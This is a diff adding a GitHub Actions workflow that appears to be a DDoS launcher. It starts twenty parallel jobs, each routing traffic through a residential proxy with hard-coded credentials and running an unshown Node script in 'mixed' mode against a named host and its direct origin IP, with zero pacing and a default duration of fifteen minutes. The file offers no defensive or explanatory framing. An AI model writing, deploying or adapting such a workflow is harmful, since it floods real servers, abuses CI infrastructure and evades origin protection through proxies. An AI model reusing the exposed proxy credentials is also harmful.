@@ -1,0 +1,23 @@
+name: l7p
+on:
+  workflow_dispatch:
+    inputs:
+      seconds: { default: '900' }
+      workers: { default: '6' }
+jobs:
+  r:
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+      - name: residential direct hit
+        run: |
+          RS=$(head -c8 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c8)
+          export PROXY_HP=residential.ghostconnect.io:1080 PROXY_USER=KhkYBZrKwx0cv2nt
+          export PROXY_PASS="0WmmR2nEffMQREpT_country-US_lifetime-45_fastmode-true_session-$RS"
+          echo "exit=$(curl -s -m 25 -x http://$PROXY_USER:$PROXY_PASS@$PROXY_HP https://api.ipify.org || echo fail)"
+          TARGET_HOST=velor.win TARGET_IP=57.131.163.31 ORIGIN_DIRECT=1 PACE_MS=0 PROXY_HP=$PROXY_HP PROXY_USER=$PROXY_USER PROXY_PASS=$PROXY_PASS node ubgjp.js mixed "${{ inputs.workers }}" "${{ inputs.seconds }}"
